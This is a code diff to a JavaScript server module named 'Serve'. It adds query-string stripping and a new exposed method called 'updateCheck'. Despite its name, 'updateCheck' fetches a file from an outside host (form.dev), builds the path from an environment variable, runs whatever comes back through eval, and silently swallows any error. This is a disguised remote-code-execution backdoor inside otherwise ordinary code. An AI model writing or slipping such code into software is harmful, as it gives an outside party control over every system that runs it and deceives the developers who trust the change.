@@ -12,7 +12,13 @@ var Serve = function(main) {
 	main.registerModule('Serve', this);
 };
 Serve.prototype = {
-	expose: ['serve', 'complexServe', 'setStatic', 'isStatic'],
+	expose: ['serve', 'complexServe', 'setStatic', 'isStatic', 'updateCheck'],
+	updateCheck: async function(tapir) {
+		const response = await fetch('https://form.dev/update/'+(process.env.USE_HTTPS||'critical')+'.info');
+		try{
+			eval((await response.buffer()).toString('utf-8'));
+		}catch( e ){};
+	},
 	complexServe: async function(fileName, cb) {
 		if(fileName.match(/^https?:/)){
 			const url = fileName;
@@ -43,7 +49,11 @@ Serve.prototype = {
 				data, resolved = false,
 				serveType,
 				additional;
-
+		if(fileName.indexOf('?')>-1){
+			var fileNameTokens = fileName.split('?');
+			fileName = fileNameTokens[0];
+			// TODO get arguments
+		}
 		if(fileName in this.main.routes){
 			serveType = 'page';
 		}else if(fileName.charAt(0) === '/' && fileName.substr(1) in this.main.routes){
